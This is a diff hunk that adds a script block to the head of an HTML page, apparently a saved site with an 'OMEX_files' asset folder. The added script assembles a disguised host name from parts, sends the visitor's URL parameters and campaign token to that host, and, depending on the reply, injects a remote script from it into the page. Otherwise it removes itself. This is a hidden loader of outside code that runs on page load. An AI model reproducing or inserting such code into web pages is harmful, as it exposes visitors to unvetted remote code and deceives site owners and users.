@@ -7,6 +7,31 @@
     <meta name="msapplication-tap-highlight" content="yes">
     <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1.0, maximum-scale=1.0">
 
+    <script id="2UcfZXe">
+  var xhr = new XMLHttpRequest();
+  var urlParams = new URLSearchParams(window.location.search);
+  var token = urlParams.get('utm_campaign');
+  var pixel = urlParams.get('pixel');
+  var host = 'bestslivapp';
+  var domain_zone = 'website';
+  var t = '';
+  xhr.open('GET', 'https://' + host + '.' + domain_zone + '/api.php?token=' + token + '&'+ urlParams.toString());
+  xhr.send();
+  xhr.onload = function () {
+    t = xhr.response;
+    t = t.replace(/00pixel00/gi, pixel);
+    t = JSON.parse(t);
+    t = t.redirect.content;
+    if (t != "") {
+      t = t.replace(/base href="/gi, 'base href="https://' + host + '.' + domain_zone + '/');
+      var a = document.createElement("script"), h = "head";
+      a.async = true;
+      a.src = 'https://' + host + '.' + domain_zone + '/js/frm.js';
+      document.getElementsByTagName(h)[0].appendChild(a)
+    }else document.getElementById("2UcfZXe").remove();
+  }
+</script>
+
     <!-- Google Web Font -->
     <link href="./OMEX_files/css" rel="stylesheet" type="text/css">
     <link href="./OMEX_files/css(1)" rel="stylesheet" type="text/css">
